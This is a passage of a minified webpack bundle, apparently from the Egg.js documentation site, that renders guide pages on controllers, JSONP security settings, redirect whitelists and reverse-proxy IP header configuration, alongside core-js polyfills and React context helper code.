 async create() {\n    const ctx = this.ctx;\n    try {\n      ctx.validate(createRule);\n    } catch (err) {\n      ctx.logger.warn(err.errors);\n      ctx.body = { success: false };\n      return;\n    }\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"validation-rules"},r.a.createElement(l["AnchorLink"],{to:"#validation-rules","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Validation Rules"),r.a.createElement("p",null,"The parameter validation is done by ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/parameter#rule"},"Parameter"),", and all supported validation rules can be found in its document."),r.a.createElement("h4",{id:"customizing-validation-rules"},r.a.createElement(l["AnchorLink"],{to:"#customizing-validation-rules","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Customizing Validation Rules"),r.a.createElement("p",null,"In addition to built-in validation types introduced in the previous section, sometimes we hope to customize several validation rules to make the development more convenient and now customized rules can be added through ",r.a.createElement("code",null,"app.validator.addRule(type, check)"),"."),r.a.createElement(o["a"],{code:"// app.js\napp.validator.addRule('json', (rule, value) => {\n  try {\n    JSON.parse(value);\n  } catch (err) {\n    return 'must be json string';\n  }\n});",lang:"js"}),r.a.createElement("p",null,"After adding the customized rule, it can be used immediately in Controller to do parameter validation."),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async handler() {\n    const ctx = this.ctx;\n    // query.test field must be a json string\n    const rule = { test: 'json' };\n    ctx.validate(rule, ctx.query);\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"using-service"},r.a.createElement(l["AnchorLink"],{to:"#using-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Service"),r.a.createElement("p",null,"We do not prefer to implement too many business logics in Controller, so a ",r.a.createElement(l["Link"],{to:"./service"},"Service")," layer is provided to encapsulate business logics, which not only increases the reusability of codes but also makes it easy for us to test our business logics."),r.a.createElement("p",null,"In Controller, any method of any Service can be called and, in the meanwhile, Service is lazy loaded which means it is only initialized by the framework on the first time it is accessed."),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async create() {\n    const ctx = this.ctx;\n    const author = ctx.session.userId;\n    const req = Object.assign(ctx.request.body, { author });\n    // using service to handle business logics\n    const res = await ctx.service.post.create(req);\n    ctx.body = { id: res.id };\n    ctx.status = 201;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"To write a Service in detail, please refer to ",r.a.createElement(l["Link"],{to:"./service"},"Service"),"."),r.a.createElement("h2",{id:"sending-http-response"},r.a.createElement(l["AnchorLink"],{to:"#sending-http-response","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Sending HTTP Response"),r.a.createElement("p",null,"After business logics are handled, the last thing Controller should do is to send the processing result to users with an HTTP response."),r.a.createElement("h3",{id:"setting-status"},r.a.createElement(l["AnchorLink"],{to:"#setting-status","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Setting Status"),r.a.createElement("p",null,"HTTP designs many ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/List_of_HTTP_status_codes"},"Status Code"),", each of which indicates a specific meaning, and setting the status code correctly makes the response more semantic."),r.a.createElement("p",null,"The framework provides a convenient Setter to set the status code:"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async create() {\n    // set status code to 201\n    this.ctx.status = 201;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"As to which status code should be used for a specific case, please refer to status code meanings on ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/List_of_HTTP_status_codes"},"List of HTTP status codes")),r.a.createElement("h3",{id:"body-setting"},r.a.createElement(l["AnchorLink"],{to:"#body-setting","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Body Setting"),r.a.createElement("p",null,"Most data is sent to requesters through the body and, just like the body in the request, the body sent by the response demands a set of corresponding Content-Type to inform clients how to parse data."),r.a.createElement("ul",null,r.a.createElement("li",null,"for a RESTful API controller, we usually send a body whose Content-Type is ",r.a.createElement("code",null,"application/json"),", indicating it's a JSON string."),r.a.createElement("li",null,"for a HTML page controller, we usually send a body whose Content-Type is ",r.a.createElement("code",null,"text/html"),", indicating it's a piece of HTML code.")),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: ",r.a.createElement("code",null,"ctx.body")," is alias of ",r.a.createElement("code",null,"ctx.response.body"),", don't confuse with ",r.a.createElement("code",null,"ctx.request.body"),".")),r.a.createElement(o["a"],{code:"class ViewController extends Controller {\n  async show() {\n    this.ctx.body = {\n      name: 'egg',\n      category: 'framework',\n      language: 'Node.js',\n    };\n  }\n\n  async page() {\n    this.ctx.body = '<html><h1>Hello</h1></html>';\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Due to the Stream feature of Node.js, we need to return the response by Stream in some cases, e.g., returning a big file, the proxy server returns content from upstream straightforward, the framework also supports setting the body into a Stream directly and handling error events on this stream well in the meanwhile."),r.a.createElement(o["a"],{code:"class ProxyController extends Controller {\n  async proxy() {\n    const ctx = this.ctx;\n    const result = await ctx.curl(url, {\n      streaming: true,\n    });\n    ctx.set(result.header);\n    // result.res is stream\n    ctx.body = result.res;\n  }\n}",lang:"js"}),r.a.createElement("h4",{id:"rendering-template"},r.a.createElement(l["AnchorLink"],{to:"#rendering-template","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Rendering Template"),r.a.createElement("p",null,"Usually we do not write HTML pages by hand, instead we generate them by a template engine. Egg itself does not integrate any template engine, but it establishes the ",r.a.createElement(l["Link"],{to:"../advanced/view-plugin"},"View Plugin Specification"),". Once the template engine is loaded, ",r.a.createElement("code",null,"ctx.render(template)")," can be used to render templates to HTML directly."),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async index() {\n    const ctx = this.ctx;\n    await ctx.render('home.tpl', { name: 'egg' });\n    // ctx.body = await ctx.renderString('hi, {{ name }}', { name: 'egg' });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"For detailed examples, please refer to ",r.a.createElement(l["Link"],{to:"../core/view"},"Template Rendering"),"."),r.a.createElement("h4",{id:"jsonp"},r.a.createElement(l["AnchorLink"],{to:"#jsonp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"JSONP"),r.a.createElement("p",null,"Sometimes we need to provide API services for pages in a different domain, and, for historical reasons, ",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS"},"CORS")," fails to make it through, while ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/JSONP"},"JSONP")," does."),r.a.createElement("p",null,"Since misuse of JSONP leads to dozens of security issues, the framework supplies a convenient way to respond JSONP data, encapsulating ",r.a.createElement(l["AnchorLink"],{to:"../core/security#jsonp-xss"},"JSONP XSS Related Security Precautions"),", and supporting the validation of CSRF and referrer."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.jsonp()")," provides a middleware for the controller to respond JSONP data. We may add this middleware to the router that needs to support jsonp:")),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const jsonp = app.jsonp();\n  app.router.get('/api/posts/:id', jsonp, app.controller.posts.show);\n  app.router.get('/api/posts', jsonp, app.controller.posts.list);\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"We just program as usual in the Controller:")),r.a.createElement(o["a"],{code:"// app/controller/posts.js\nclass PostController extends Controller {\n  async show() {\n    this.ctx.body = {\n      name: 'egg',\n      category: 'framework',\n      language: 'Node.js',\n    };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"When user's requests access this controller through a corresponding URL, if the query contains the ",r.a.createElement("code",null,"_callback=fn")," parameter, data is returned in JSONP format, otherwise in JSON format."),r.a.createElement("h5",{id:"jsonp-configuration"},r.a.createElement(l["AnchorLink"],{to:"#jsonp-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"JSONP Configuration"),r.a.createElement("p",null,"By default, the framework determines whether to return data in JSONP format or not depending on the ",r.a.createElement("code",null,"_callback")," parameter in the query, and the method name set by ",r.a.createElement("code",null,"_callback")," must be less than 50 characters. Applications may overwrite the default configuration globally in ",r.a.createElement("code",null,"config/config.default.js"),":"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.jsonp = {\n  callback: 'callback', // inspecting the `callback` parameter in the query\n  limit: 100, // the maximum size of the method name is 100 characters\n};",lang:"js"}),r.a.createElement("p",null,"With the configuration above, if a user requests ",r.a.createElement("code",null,"/api/posts/1?callback=fn"),", a JSONP format response is sent, if ",r.a.createElement("code",null,"/api/posts/1"),", a JSON format response is sent."),r.a.createElement("p",null,"Also we can overwrite the default configuration in ",r.a.createElement("code",null,"app.jsonp()")," when creating the middleware and therefore separate configurations is used for separate routers:"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller, jsonp } = app;\n  router.get(\n    '/api/posts/:id',\n    jsonp({ callback: 'callback' }),\n    controller.posts.show,\n  );\n  router.get('/api/posts', jsonp({ callback: 'cb' }), controller.posts.list);\n};",lang:"js"}),r.a.createElement("h4",{id:"xss-defense-configuration"},r.a.createElement(l["AnchorLink"],{to:"#xss-defense-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"XSS Defense Configuration"),r.a.createElement("p",null,"By default, XSS is not defended when responding JSONP, and, in some cases, it is quite dangerous. We classify JSONP APIs into three type grossly:"),r.a.createElement("ol",null,r.a.createElement("li",null,"querying non-sensitive data, e.g. getting the public post list of a BBS."),r.a.createElement("li",null,"querying sensitive data, e.g. getting the transaction record of a user."),r.a.createElement("li",null,"submitting data and modifying the database, e.g. create a new order for a user.")),r.a.createElement("p",null,"If our JSONP API provides the last two type services and, without any XSS defense, user's sensitive data may be leaked and even user may be phished. Given this, the framework supports the validations of CSRF and referrer by default."),r.a.createElement("h5",{id:"csrf"},r.a.createElement(l["AnchorLink"],{to:"#csrf","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"CSRF"),r.a.createElement("p",null,"In the JSONP configuration, we could enable the CSRF validation for JSONP APIs simply by setting ",r.a.createElement("code",null,"csrf: true"),"."),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  jsonp: {\n    csrf: true,\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: the CSRF validation depends on the Cookie based CSRF validation provided by ",r.a.createElement(l["Link"],{to:"../core/security"},"security"),".")),r.a.createElement("p",null,"When the CSRF validation is enabled, the client should bring CSRF token as well when it sends a JSONP request, if the page where the JSONP sender belongs to shares the same domain with our services, CSRF token in Cookie can be read(CSRF can be set manually if it is absent), and is brought together with the request."),r.a.createElement("h5",{id:"validation-reference"},r.a.createElement(l["AnchorLink"],{to:"#validation-reference","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Validation Reference"),r.a.createElement("p",null,"The CSRF way can be used for JSONP request validation only if the main domains are the same, while providing JSONP services for pages in different domains, we can limit JSONP senders into a controllable rang by configuring the referrer whitelist."),r.a.createElement(o["a"],{code:"//config/config.default.js\nexports.jsonp = {\n  whiteList: /^https?:\\/\\/test.com\\//,\n  // whiteList: '.test.com',\n  // whiteList: 'sub.test.com',\n  // whiteList: [ 'sub.test.com', 'sub2.test.com' ],\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"whileList")," can be configured as regular expression, string and array:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Regular Expression: only requests whose Referrer match the regular expression are allowed to access the JSONP API. When composing the regular expression, please also notice the leading ",r.a.createElement("code",null,"^")," and tail ",r.a.createElement("code",null,"\\/")," which guarantees the whole domain matches.")),r.a.createElement(o["a"],{code:"exports.jsonp = {\n  whiteList: /^https?:\\/\\/test.com\\//,\n};\n// matches referrer:\n// https://test.com/hello\n// http://test.com/",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"String: two cases exists when configuring the whitelist as a string, if the string begins with a ",r.a.createElement("code",null,"."),", e.g. ",r.a.createElement("code",null,".test.com"),", the referrer whitelist indicates all sub-domains of ",r.a.createElement("code",null,"test.com"),", ",r.a.createElement("code",null,"test.com")," itself included. if the string does not begin with a ",r.a.createElement("code",null,"."),", e.g. ",r.a.createElement("code",null,"sub.test.com"),", it indicates ",r.a.createElement("code",null,"sub.test.com")," one domain only. (both HTTP and HTTPS are supported)")),r.a.createElement(o["a"],{code:"exports.jsonp = {\n  whiteList: '.test.com',\n};\n// matches domain test.com:\n// https://test.com/hello\n// http://test.com/\n\n// matches subdomain\n// https://sub.test.com/hello\n// http://sub.sub.test.com/\n\nexports.jsonp = {\n  whiteList: 'sub.test.com',\n};\n// only matches domain sub.test.com:\n// https://sub.test.com/hello\n// http://sub.test.com/",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Array: when the whitelist is configured as an array, the referrer validation is passed only if at least one condition represented by array items is matched.")),r.a.createElement(o["a"],{code:"exports.jsonp = {\n  whiteList: ['sub.test.com', 'sub2.test.com'],\n};\n// matches domain sub.test.com and sub2.test.com:\n// https://sub.test.com/hello\n// http://sub2.test.com/",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"If both CSRF and referrer validation are enabled, the request sender passes any one of them passes the JSONP security validation.")),r.a.createElement("h3",{id:"header-setting"},r.a.createElement(l["AnchorLink"],{to:"#header-setting","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Header Setting"),r.a.createElement("p",null,"We identify whether the request is successful or not by using the status code and set response content in the body. By setting the response header, extended information can be set as well."),r.a.createElement("p",null,r.a.createElement("code",null,"ctx.set(key, value)")," sets one response header and ",r.a.createElement("code",null,"ctx.set(headers)")," sets many in one time."),r.a.createElement(o["a"],{code:"// app/controller/api.js\nclass ProxyController extends Controller {\n  async show() {\n    const ctx = this.ctx;\n    const start = Date.now();\n    ctx.body = await ctx.service.post.get();\n    const used = Date.now() - start;\n    // set one response header\n    ctx.set('show-response-time', used.toString());\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"redirect"},r.a.createElement(l["AnchorLink"],{to:"#redirect","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Redirect"),r.a.createElement("p",null,"The framework overwrites koa's native ",r.a.createElement("code",null,"ctx.redirect")," implementation with a security plugin to provide a more secure redirect."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.redirect(url)")," Forbids redirect if it is not in the configured whitelist domain name."),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.unsafeRedirect(url)")," does not determine the domain name and redirect directly. Generally, it is not recommended to use it. Use it after clearly understanding the possible risks.")),r.a.createElement("p",null,"If you use the ",r.a.createElement("code",null,"ctx.redirect")," method, you need to configure the application configuration file as follows:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.security = {\n  domainWhiteList: ['.domain.com'], // Security whitelist, starts with `.`\n};",lang:"js"}),r.a.createElement("p",null,"If the user does not configure the ",r.a.createElement("code",null,"domainWhiteList")," or the ",r.a.createElement("code",null,"domainWhiteList")," array to be empty, then all redirect requests will be released by default, which is equivalent to ",r.a.createElement("code",null,"ctx.unsafeRedirect(url)"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},j9mU:function(e,t,n){"use strict";var a=n("XAFM");e.exports=Function.prototype.bind||a},j9ts:function(e,t,n){var a=n("oyD1"),r=n("XaNN"),l=n("q7Pv"),o=l("species");e.exports=function(e,t){var n,l=a(e).constructor;return void 0===l||void 0==(n=a(l)[o])?t:r(n)}},"jA+a":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Generally, our services will not directly accept external requests, but will deploy the services behind the access layer, thus achieving load balancing of multiple machines and smooth distribution of services to ensure high availability."),r.a.createElement("p",null,"In this scenario, we can't directly get the connection to the real user request, so we can't confirm the user's real IP, request protocol, or even the requested host. To solve this problem, the framework provides a set of configuration items by default for developers to configure to enable the application layer to obtain real user request information based on the agreement(de facto) with the access layer."),r.a.createElement("h2",{id:"enable-proxy-mode"},r.a.createElement(l["AnchorLink"],{to:"#enable-proxy-mode","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Enable Proxy Mode"),r.a.createElement("p",null,"The proxy mode can be enabled by ",r.a.createElement("code",null,"config.proxy = true"),":"),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.proxy = true;",lang:"js"}),r.a.createElement("p",null,"Note that after this mode is enabled, the application defaults to being behind the reverse proxy. It will support the request header of the resolved protocol to obtain the real IP, protocol and host of the client. If your service is not deployed behind a reverse proxy, do not enable this configuration in case a malicious user falsifies information such as requesting IP."),r.a.createElement("h3",{id:"configipheaders"},r.a.createElement(l["AnchorLink"],{to:"#configipheaders","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"config.ipHeaders")),r.a.createElement("p",null,"When the proxy configuration is enabled, the app parses the ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/X-Forwarded-For"},"X-Forwarded-For")," request header to get the real IP of the client. If your reverse proxy passes this information through other request headers, it can be configured via ",r.a.createElement("code",null,"config.ipHeaders"),", which supports multiple headers (comma separated)."),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.ipHeaders = 'X-Real-Ip, X-Forwarded-For';",lang:"js"}),r.a.createElement("h3",{id:"configmaxipscount"},r.a.createElement(l["AnchorLink"],{to:"#configmaxipscount","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"config.maxIpsCount")),r.a.createElement("p",null,"The general format of the ",r.a.createElement("code",null,"X-Forwarded-For")," field is:"),r.a.createElement(o["a"],{code:"X-Forwarded-For: client, proxy1, proxy2",lang:"unknown"}),r.a.createElement("p",null,"We can use the first IP address as the real IP adderess of the request, but if a malicious user passes the ",r.a.createElement("code",null,"X-Forwarded-For")," header in the request to spoof it after some reverse proxy, it will cause ",r.a.createElement("code",null,"X-Forwarded-For")," to take The value obtained is inaccurate and can be used to spoof the request IP address, breaking some IP restrictions of the application layer."),r.a.createElement(o["a"],{code:"X-Forwarded-For: fake, client, proxy1, proxy2",lang:"unknown"}),r.a.createElement("p",null,"In order to avoid this problem, we can configure the number of reverse proxies through ",r.a.createElement("code",null,"config.maxIpsCount"),", so the fake IP address passed by the user will be ignored. For example, if we deploy the application behind a unified access layer (such as Alibaba Cloud SLB, Amazon ELB), we can configure this configuration to ",r.a.createElement("code",null,"1")," so that users cannot forge IP addresses through the ",r.a.createElement("code",null,"X-Forwarded-For")," request header."),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.maxIpsCount = 1;",lang:"js"}),r.a.createElement("p",null,"This configuration item has the same effect as ",r.a.createElement("code",null,"options.maxIpsCount")," provided by ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/koa/blob/master/docs/api/request.md#requestips"},"koa"),"."),r.a.createElement("h3",{id:"configprotocolheaders"},r.a.createElement(l["AnchorLink"],{to:"#configprotocolheaders","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"config.protocolHeaders")),r.a.createElement("p",null,"When the proxy configuration is enabled, the application will parse the [X-Forwarded-Proto] (",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Proto"},"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Proto"),") request header to get the client's Real access protocol. If your reverse proxy passes this information through other request headers, it can be configured via ",r.a.createElement("code",null,"config.protocolHeaders"),", which supports multiple headers (comma separated)."),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.protocolHeaders = 'X-Real-Proto, X-Forwarded-Proto';",lang:"js"}),r.a.createElement("h3",{id:"confighostheaders"},r.a.createElement(l["AnchorLink"],{to:"#confighostheaders","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"config.hostHeaders")),r.a.createElement("p",null,"When the proxy configuration is enabled, the application still reads ",r.a.createElement("code",null,"host")," directly to get the requested domain name. Most of the reverse proxy does not modify this value. But maybe some reverse proxy will pass the client's real access via [X-Forwarded-Host] (",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host"},"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host"),") The domain name can be configured via ",r.a.createElement("code",null,"config.hostHeaders"),", which supports multiple headers (comma separated)."),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.hostHeaders = 'X-Forwarded-Host';",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},jAHp:function(e,t,n){var a=n("m4/z"),r=n("TzLU");(e.exports=function(e,t){return r[e]||(r[e]=void 0!==t?t:{})})("versions",[]).push({version:"3.6.5",mode:a?"pure":"global",copyright:"\xa9 2020 Denis Pushkarev (zloirock.ru)"})},jBb1:function(e,t,n){"use strict";var a=n("0mt+"),r=n("7Vsj").trim,l=n("4BFV");a({target:"String",proto:!0,forced:l("trim")},{trim:function(){return r(this)}})},jDmY:function(e,t,n){"use strict";function a(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}n.d(t,"a",(function(){return a}))},jFhh:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"resources"},r.a.createElement(l["AnchorLink"],{to:"#resources","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Resources"),r.a.createElement("ul",null,r.a.createElement("li",null,"Frameworks",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/aliyun-egg"},"aliyun-egg")))),r.a.createElement("li",null,"Tools",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://marketplace.visualstudio.com/items?itemName=atian25.eggjs"},"vscode plugin - eggjs")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://marketplace.visualstudio.com/items?itemName=yuzukwok.eggjs-dev-tools"},"vscode plugin - eggjs-dev-tools")))),r.a.createElement("li",null,"Others",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/awesome-egg"},"awesome-egg")))),r.a.createElement("li",null,"Articles",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://www.zhihu.com/question/50526101/answer/144952130"},"How to evaluate Ali's open source enterprise-level Node.js framework Egg?")," By ",r.a.createElement(l["Link"],{to:"https://github.com/atian25"},"@day pig")),r.a.createElement("li",null,"You can also read our article at ",r.a.createElement(l["Link"],{to:"https://zhuanlan.zhihu.com/eggjs"},"Kuroshiami column"))))),r.a.createElement("h2",{id:"sponsors-and-backers"},r.a.createElement(l["AnchorLink"],{to:"#sponsors-and-backers","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Sponsors and Backers"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://opencollective.com/eggjs#support"},r.a.createElement("img",{src:"https://opencollective.com/eggjs/tiers/sponsors.svg?avatarHeight=48",alt:"sponsors"})),r.a.createElement(l["Link"],{to:"https://opencollective.com/eggjs#support"},r.a.createElement("img",{src:"https://opencollective.com/eggjs/tiers/backers.svg?avatarHeight=48",alt:"backers"}))),r.a.createElement("h2",{id:"contributors"},r.a.createElement(l["AnchorLink"],{to:"#contributors","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Contributors"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/graphs/contributors"},r.a.createElement("img",{src:"https://contrib.rocks/image?repo=eggjs/egg&max=240&columns=26",alt:"contributors"})))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},jNQk:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("XaNN"),i=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{merge:function(e){var t=l(this),n=o(t.set),a=0;while(a<arguments.length)i(arguments[a++],n,t,!0);return t}})},jTOb:function(e,t,n){"use strict";var a=n("0mt+"),r=n("Ve8J").right,l=n("xxe1"),o=n("hOjR"),i=l("reduceRight"),c=o("reduce",{1:0});a({target:"Array",proto:!0,forced:!i||!c},{reduceRight:function(e){return r(this,e,arguments.length,arguments.length>1?arguments[1]:void 0)}})},jXIH:function(e,t,n){var a=n("WM7W");a("patternMatch")},jXzy:function(e,t,n){"use strict";var a="%[a-f0-9]{2}",r=new RegExp("("+a+")|([^%]+?)","gi"),l=new RegExp("("+a+")+","gi");function o(e,t){try{return[decodeURIComponent(e.join(""))]}catch(r){}if(1===e.length)return e;t=t||1;var n=e.slice(0,t),a=e.slice(t);return Array.prototype.concat.call([],o(n),o(a))}function i(e){try{return decodeURIComponent(e)}catch(a){for(var t=e.match(r)||[],n=1;n<t.length;n++)e=o(t,n).join(""),t=e.match(r)||[];return e}}function c(e){var t={"%FE%FF":"\ufffd\ufffd","%FF%FE":"\ufffd\ufffd"},n=l.exec(e);while(n){try{t[n[0]]=decodeURIComponent(n[0])}catch(s){var a=i(n[0]);a!==n[0]&&(t[n[0]]=a)}n=l.exec(e)}t["%C2"]="\ufffd";for(var r=Object.keys(t),o=0;o<r.length;o++){var c=r[o];e=e.replace(new RegExp(c,"g"),t[c])}return e}e.exports=function(e){if("string"!==typeof e)throw new TypeError("Expected `encodedURI` to be of type `string`, got `"+typeof e+"`");try{return e=e.replace(/\+/g," "),decodeURIComponent(e)}catch(t){return c(e)}}},jdHz:function(e,t){e.exports=function(e){try{return{error:!1,value:e()}}catch(t){return{error:!0,value:t}}}},ju0s:function(e,t,n){"use strict";var a=n("0mt+"),r=n("9Rcy"),l=n("XejE"),o=n("m/os"),i=n("PE5i"),c=n("Yftc"),s=n("vr25").f;r&&a({target:"Object",proto:!0,forced:l},{__lookupSetter__:function(e){var t,n=o(this),a=i(e,!0);do{if(t=s(n,a))return t.set}while(n=c(n))}})},k1LG:function(e,t,n){"use strict";(function(e){var a=n("FU0I"),r=n.n(a),l=n("T68Q"),o=n("3uL2"),i=n.n(o),c=1073741823,s="undefined"!==typeof globalThis?globalThis:"undefined"!==typeof window?window:"undefined"!==typeof e?e:{};function u(){var e="__global_unique_id__";return s[e]=(s[e]||0)+1}function d(e,t){return e===t?0!==e||1/e===1/t:e!==e&&t!==t}function m(e){var t=[];return{on:function(e){t.push(e)},off:function(e){t=t.filter((function(t){return t!==e}))},get:function(){return e},set:function(n,a){e=n,t.forEach((function(t){return t(e,a)}))}}}function p(e){return Array.isArray(e)?e[0]:e}function h(e,t){var n,r,o="__create-react-context-"+u()+"__",s=function(e){function n(){var t;return t=e.apply(this,arguments)||this,t.emitter=m(t.props.value),t}Object(l["a"])(n,e);var a=n.prototype;return a.getChildContext=function(){var e;return e={},e[o]=this.emitter,e},a.componentWillReceiveProps=function(e){if(this.props.value!==e.value){var n,a=this.props.value,r=e.value;d(a,r)?n=0:(n="function"===typeof t?t(a,r):c,n|=0,0!==n&&this.emitter.set(e.value,n))}},a.render=function(){return this.props.children},n}(a["Component"]);s.childContextTypes=(n={},n[o]=i.a.object.isRequired,n);var h=function(t){function n(){var e;return e=t.apply(this,arguments)||this,e.state={value:e.getValue()},e.onUpdate=function(t,n){var a=0|e.observedBits;0!==(a&n)&&e.setState({value:e.getValue()})},e}Object(l["a"])(n,t);var a=n.prototype;return a.componentWillReceiveProps=function(e){var t=e.observedBits;this.observedBits=void 0===t||null===t?c:t},a.componentDidMount=function(){this.context[o]&&this.context[o].on(this.onUpdate);var e=this.props.observedBits;this.observedBits=void 0===e||null===e?c:e},a.componentWillUnmount=function(){this.context[o]&&this.context[o].off(this.onUpdate)},a.getValue=function(){return this.context[o]?this.context[o].get():e},a.render=function(){return p(this.props.children)(this.state.value)},n}(a["Component"]);return h.contextTypes=(r={},r[o]=i.a.object,r),{Provider:s,Consumer:h}}var g=r.a.createContext||h;t["a"]=g}).call(this,n("CwJZ"))},k8mt:function(e,t){e.exports=function(e,t,n){if(!(e instanceof t))throw TypeError("Incorrect "+(n?n+" ":"")+"invocation");return e}},kIuA:function(e,t,n){"use strict";var 